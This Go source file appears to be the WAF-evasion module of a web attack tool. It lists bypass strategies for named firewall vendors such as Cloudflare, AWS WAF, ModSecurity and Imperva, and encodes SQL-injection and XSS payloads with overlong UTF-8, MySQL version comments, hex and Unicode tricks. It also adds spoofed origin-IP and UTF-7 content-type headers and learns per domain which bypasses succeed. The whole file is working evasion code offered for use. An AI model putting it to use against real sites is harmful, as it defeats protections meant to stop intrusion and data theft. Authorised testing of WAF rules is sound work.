package wafintel

import (
	"fmt"
	"math/rand"
	"net/url"
	"sort"
	"strings"
	"time"
	"unicode"
)

type Strategy struct {
	ID          string   `json:"id"`
	Vendor      string   `json:"vendor"`
	Name        string   `json:"name"`
	Encodings   []string `json:"encodings"`
	Protocol    []string `json:"protocol"`
	Description string   `json:"description"`
}

var vendorStrategies = map[string][]Strategy{
	"cloudflare": {
		{ID: "cf_unicode_cascade", Vendor: "Cloudflare", Name: "unicode_cascade", Encodings: []string{"unicode", "url", "double_url"}, Protocol: []string{"chunked"}, Description: "Unicode + double URL with chunked body"},
		{ID: "cf_ct_confusion", Vendor: "Cloudflare", Name: "content_type_confusion", Encodings: []string{"url"}, Protocol: []string{"content_type_swap"}, Description: "Content-Type confusion bypass"},
	},
	"akamai": {
		{ID: "akamai_fragment", Vendor: "Akamai", Name: "request_fragmentation", Encodings: []string{"html_entity", "url"}, Protocol: []string{"fragmentation", "line_fold"}, Description: "Fragmented payload with HTML entities"},
	},
	"aws waf": {
		{ID: "aws_hpp", Vendor: "AWS WAF", Name: "parameter_pollution", Encodings: []string{"url"}, Protocol: []string{"hpp"}, Description: "Duplicate parameter precedence"},
		{ID: "aws_mixed_encode", Vendor: "AWS WAF", Name: "mixed_encoding", Encodings: []string{"hex", "url", "mixed"}, Protocol: []string{}, Description: "Mixed hex/url encoding cascade"},
	},
	"modsecurity": {
		{ID: "modsec_comment_split", Vendor: "ModSecurity", Name: "comment_splitting", Encodings: []string{"url"}, Protocol: []string{"comment_injection"}, Description: "SQL/XSS comment splitting"},
		{ID: "modsec_octal", Vendor: "ModSecurity", Name: "octal_encoding", Encodings: []string{"octal", "url"}, Protocol: []string{}, Description: "Octal escape cascade"},
	},
	"imperva": {
		{ID: "imperva_timing", Vendor: "Imperva", Name: "timing_evasion", Encodings: []string{"url"}, Protocol: []string{"timing_jitter"}, Description: "Timing jitter between fragments"},
		{ID: "imperva_unicode", Vendor: "Imperva", Name: "unicode_overlong", Encodings: []string{"unicode", "double_url"}, Protocol: []string{}, Description: "Unicode overlong encoding"},
	},
	"fastly": {
		{ID: "fastly_header_override", Vendor: "Fastly", Name: "header_override", Encodings: []string{"url"}, Protocol: []string{"origin_spoofing"}, Description: "Origin IP header bypass"},
	},
	"azure front door": {
		{ID: "azure_path_pollution", Vendor: "Azure Front Door", Name: "path_pollution", Encodings: []string{"url", "double_url"}, Protocol: []string{"method_override"}, Description: "Method override and double URL encoding"},
	},
	"f5 big-ip": {
		{ID: "f5_tab_whitespace", Vendor: "F5 BIG-IP", Name: "tab_whitespace", Encodings: []string{"tab_whitespace", "url"}, Protocol: []string{"chunked"}, Description: "Tab whitespace with chunked transfer"},
	},
	"sucuri": {
		{ID: "sucuri_comment_mutate", Vendor: "Sucuri", Name: "mysql_version_comment", Encodings: []string{"mysql_version_comment"}, Protocol: []string{"origin_spoofing"}, Description: "MySQL version comment and IP masquerade"},
	},
	"fortinet": {
		{ID: "forti_json_unicode", Vendor: "Fortinet", Name: "json_unicode", Encodings: []string{"json_unicode"}, Protocol: []string{"content_type_swap"}, Description: "JSON unicode escaping"},
	},
}

type LearningProfile struct {
	Domain           string         `json:"domain"`
	StrategyScores   map[string]int `json:"strategy_scores"`
	TechniqueScores  map[string]int `json:"technique_scores,omitempty"`
	BlockedEncodings []string       `json:"blocked_encodings"`
	BlockedChars     []string       `json:"blocked_chars,omitempty"`
	AllowedChars     []string       `json:"allowed_chars,omitempty"`
	LastSuccessful   string         `json:"last_successful"`
	LastTechnique    string         `json:"last_technique,omitempty"`
}

func NewLearningProfile(domain string) LearningProfile {
	return LearningProfile{
		Domain:          domain,
		StrategyScores:  map[string]int{},
		TechniqueScores: map[string]int{},
	}
}

func RecordCharResult(learn LearningProfile, charToken string, allowed bool) LearningProfile {
	charToken = strings.TrimSpace(charToken)
	if charToken == "" {
		return learn
	}
	if allowed {
		learn.AllowedChars = appendUniqueString(learn.AllowedChars, charToken)
	} else {
		learn.BlockedChars = appendUniqueString(learn.BlockedChars, charToken)
	}
	return learn
}

func appendUniqueString(list []string, item string) []string {
	for _, s := range list {
		if s == item {
			return list
		}
	}
	return append(list, item)
}

func SelectStrategy(vendor string, learn LearningProfile) Strategy {
	v := strings.ToLower(strings.TrimSpace(vendor))
	list := vendorStrategies[v]
	if len(list) == 0 {
		list = defaultStrategies()
	}
	best := list[0]
	bestScore := -1000
	for _, s := range list {
		score := learn.StrategyScores[s.ID]
		if s.ID == learn.LastSuccessful {
			score += 3
		}
		if score > bestScore {
			bestScore = score
			best = s
		}
	}
	return best
}

func defaultStrategies() []Strategy {
	return []Strategy{
		{ID: "generic_url", Vendor: "generic", Name: "url_encode", Encodings: []string{"url"}, Protocol: []string{}},
	}
}

func RecordStrategyResult(learn LearningProfile, strategyID string, success bool) LearningProfile {
	if learn.StrategyScores == nil {
		learn.StrategyScores = map[string]int{}
	}
	if success {
		learn.StrategyScores[strategyID] += 2
		learn.LastSuccessful = strategyID
	} else {
		learn.StrategyScores[strategyID]--
	}
	return learn
}

func RecordTechniqueResult(learn LearningProfile, technique string, success bool) LearningProfile {
	technique = strings.ToLower(strings.TrimSpace(technique))
	if technique == "" {
		return learn
	}
	if learn.TechniqueScores == nil {
		learn.TechniqueScores = map[string]int{}
	}
	if success {
		learn.TechniqueScores[technique] += 2
		learn.LastTechnique = technique
	} else {
		learn.TechniqueScores[technique]--
		learn.BlockedEncodings = appendBlockedTechnique(learn.BlockedEncodings, technique)
	}
	return learn
}

func PreferredTechniques(learn LearningProfile) []string {
	type item struct {
		name  string
		score int
	}
	var ranked []item
	for name, score := range learn.TechniqueScores {
		name = strings.ToLower(strings.TrimSpace(name))
		if name == "" || score <= 0 {
			continue
		}
		if name == learn.LastTechnique {
			score += 3
		}
		ranked = append(ranked, item{name: name, score: score})
	}
	sort.SliceStable(ranked, func(i, j int) bool {
		if ranked[i].score != ranked[j].score {
			return ranked[i].score > ranked[j].score
		}
		return ranked[i].name < ranked[j].name
	})
	out := make([]string, 0, len(ranked))
	for _, item := range ranked {
		out = append(out, item.name)
	}
	return out
}

func appendBlockedTechnique(blocked []string, technique string) []string {
	for _, item := range blocked {
		if strings.EqualFold(strings.TrimSpace(item), technique) {
			return blocked
		}
	}
	return append(blocked, technique)
}

func ApplyStrategy(payload string, strategy Strategy) (string, map[string]string) {
	out := MutatePayload(payload)
	headers := map[string]string{}
	for _, enc := range strategy.Encodings {
		out = ApplyEncoding(out, enc)
	}
	for _, trick := range strategy.Protocol {
		switch trick {
		case "chunked":
			headers["Transfer-Encoding"] = "chunked"
		case "content_type_swap":
			headers["Content-Type"] = "text/plain; charset=utf-7"
		case "line_fold":
			headers["X-Akca-Line-Fold"] = "1"
		case "timing_jitter":
			headers["X-Akca-Timing-Jitter"] = "true"
		case "hpp":
			out = out + "&akca=1"
		case "fragmentation":
			out = fragmentPayload(out)
		case "comment_injection":
			out = strings.ReplaceAll(out, " ", "/**/")
		case "origin_spoofing":
			headers["X-Forwarded-For"] = "127.0.0.1"
			headers["X-Originating-IP"] = "127.0.0.1"
			headers["X-Real-IP"] = "127.0.0.1"
		case "method_override":
			headers["X-HTTP-Method-Override"] = "POST"
		}
	}
	return out, headers
}

func ApplyEncoding(s, enc string) string {
	switch enc {
	case "url":
		return url.QueryEscape(s)
	case "double_url":
		return url.QueryEscape(url.QueryEscape(s))
	case "selective_url":
		r := strings.ReplaceAll(s, " ", "%20")
		r = strings.ReplaceAll(r, "'", "%27")
		r = strings.ReplaceAll(r, `"`, "%22")
		r = strings.ReplaceAll(r, "<", "%3c")
		r = strings.ReplaceAll(r, ">", "%3e")
		r = strings.ReplaceAll(r, "(", "%28")
		r = strings.ReplaceAll(r, ")", "%29")
		r = strings.ReplaceAll(r, ";", "%3b")
		return r
	case "overlong_utf8":
		r := strings.ReplaceAll(s, "/", "%c0%af")
		r = strings.ReplaceAll(r, ".", "%c0%ae")
		r = strings.ReplaceAll(r, "'", "%c0%a7")
		r = strings.ReplaceAll(r, "<", "%c0%bc")
		r = strings.ReplaceAll(r, ">", "%c0%be")
		return r
	case "unicode":
		return unicodeEscape(s)
	case "html_entity":
		return htmlEntityEncode(s)
	case "hex_html_entity":
		r := strings.ReplaceAll(s, "<", "&#x3c;")
		r = strings.ReplaceAll(r, ">", "&#x3e;")
		r = strings.ReplaceAll(r, "'", "&#x27;")
		r = strings.ReplaceAll(r, `"`, "&#x22;")
		r = strings.ReplaceAll(r, "/", "&#x2f;")
		return r
	case "zero_padded_entity":
		r := strings.ReplaceAll(s, "<", "&#0000060;")
		r = strings.ReplaceAll(r, ">", "&#0000062;")
		r = strings.ReplaceAll(r, "'", "&#0000039;")
		r = strings.ReplaceAll(r, `"`, "&#0000034;")
		return r
	case "js_hex_escape":
		r := strings.ReplaceAll(s, "'", `\x27`)
		r = strings.ReplaceAll(r, `"`, `\x22`)
		r = strings.ReplaceAll(r, "<", `\x3c`)
		r = strings.ReplaceAll(r, ">", `\x3e`)
		return r
	case "hex":
		return hexEncode(s)
	case "octal":
		return octalEncode(s)
	case "tab_whitespace":
		return strings.ReplaceAll(s, " ", "%09")
	case "newline_whitespace":
		return strings.ReplaceAll(s, " ", "%0a")
	case "json_unicode":
		r := strings.ReplaceAll(s, "'", `\u0027`)
		r = strings.ReplaceAll(r, `"`, `\u0022`)
		r = strings.ReplaceAll(r, "<", `\u003c`)
		r = strings.ReplaceAll(r, ">", `\u003e`)
		return r
	case "mysql_version_comment":
		r := strings.ReplaceAll(s, "SELECT", "/*!50000SELECT*/")
		r = strings.ReplaceAll(r, "UNION", "/*!50000UNION*/")
		r = strings.ReplaceAll(r, "FROM", "/*!50000FROM*/")
		r = strings.ReplaceAll(r, "WHERE", "/*!50000WHERE*/")
		return r
	case "mixed":
		if len(s) == 0 {
			return s
		}
		return url.QueryEscape(string(s[0])) + htmlEntityEncode(s[1:])
	case "unicode_nfkc":
		r := strings.ReplaceAll(s, "<", "\uff1c")
		r = strings.ReplaceAll(r, ">", "\uff1e")
		r = strings.ReplaceAll(r, "'", "\uff07")
		r = strings.ReplaceAll(r, `"`, "\uff02")
		r = strings.ReplaceAll(r, "(", "\uff08")
		r = strings.ReplaceAll(r, ")", "\uff09")
		r = strings.ReplaceAll(r, "/", "\uff0f")
		return r
	default:
		return s
	}
}

func EncodingCascade(s string, encodings ...string) string {
	out := s
	for _, enc := range encodings {
		out = ApplyEncoding(out, enc)
	}
	return out
}

func MutatePayload(s string) string {
	var b strings.Builder
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i, r := range s {
		if i%2 == rng.Intn(2) {
			b.WriteRune(unicode.ToUpper(r))
		} else {
			b.WriteRune(unicode.ToLower(r))
		}
	}
	return b.String()
}

func fragmentPayload(s string) string {
	if len(s) <= 4 {
		return s
	}
	mid := len(s) / 2
	return s[:mid] + "\r\n " + s[mid:]
}

func unicodeEscape(s string) string {
	var b strings.Builder
	for _, r := range s {
		if r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' {
			b.WriteString(fmt.Sprintf("\\u%04x", r))
		} else {
			b.WriteRune(r)
		}
	}
	return b.String()
}

func hexByte(b byte) []byte {
	const hexdigits = "0123456789ABCDEF"
	return []byte{hexdigits[b>>4], hexdigits[b&0x0f]}
}

func htmlEntityEncode(s string) string {
	var b strings.Builder
	for _, r := range s {
		switch r {
		case '<':
			b.WriteString("&#60;")
		case '>':
			b.WriteString("&#62;")
		case '"':
			b.WriteString("&quot;")
		case '\'':
			b.WriteString("&#39;")
		default:
			b.WriteRune(r)
		}
	}
	return b.String()
}

func hexEncode(s string) string {
	// If it contains SQL keywords, encode as MySQL-compatible hex: 0x...
	lower := strings.ToLower(s)
	if strings.Contains(lower, "select") || strings.Contains(lower, "union") || strings.Contains(lower, "or 1=1") {
		var b strings.Builder
		b.WriteString("0x")
		for _, r := range s {
			b.WriteString(fmt.Sprintf("%02x", r))
		}
		return b.String()
	}
	var b strings.Builder
	for _, r := range s {
		b.WriteString(`\x`)
		hb := hexByte(byte(r))
		b.Write(hb)
	}
	return b.String()
}

func octalEncode(s string) string {
	var b strings.Builder
	for _, r := range s {
		b.WriteString(fmt.Sprintf("\\%o", r))
	}
	return b.String()
}

func AllVendors() []string {
	return []string{"Cloudflare", "Akamai", "AWS WAF", "ModSecurity", "Imperva"}
}

// IsURLSafePayload returns true if the string consists exclusively of RFC 3986
// unreserved characters ([a-zA-Z0-9\-_.~]) and valid percent-encoded octets (%XX).
// Such payloads are already transport-safe for query parameters and do not require
// an additional url.QueryEscape wrap.
func IsURLSafePayload(s string) bool {
	if s == "" {
		return true
	}
	for i := 0; i < len(s); i++ {
		c := s[i]
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') ||
			c == '-' || c == '.' || c == '_' || c == '~' {
			continue
		}
		if c == '%' && i+2 < len(s) && isHexByte(s[i+1]) && isHexByte(s[i+2]) {
			i += 2
			continue
		}
		return false
	}
	return true
}

func isHexByte(c byte) bool {
	return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')
}
